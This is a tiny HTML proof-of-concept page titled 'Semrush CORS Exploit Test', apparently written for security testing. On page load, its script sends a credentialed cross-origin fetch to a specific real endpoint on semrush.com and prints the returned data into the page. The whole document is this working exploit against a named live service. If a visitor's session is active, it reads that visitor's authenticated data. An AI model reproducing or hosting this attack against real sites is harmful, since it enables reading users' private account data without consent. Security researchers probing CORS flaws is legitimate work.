<!DOCTYPE html>
<html>
  <body>
    <h2>Semrush CORS Exploit Test</h2>
    <script>
      fetch("https://www.semrush.com/olaf", {
        method: "GET",  // ✅ No body
        credentials: "include"
      })
      .then(response => response.text())
      .then(data => {
        document.body.innerHTML += `<pre>✅ Status: 200\n\nResponse:\n${data}</pre>`;
      })
      .catch(error => {
        document.body.innerHTML += `<pre>❌ Fetch failed:\n${error}</pre>`;
      });
    </script>
  </body>
</html>
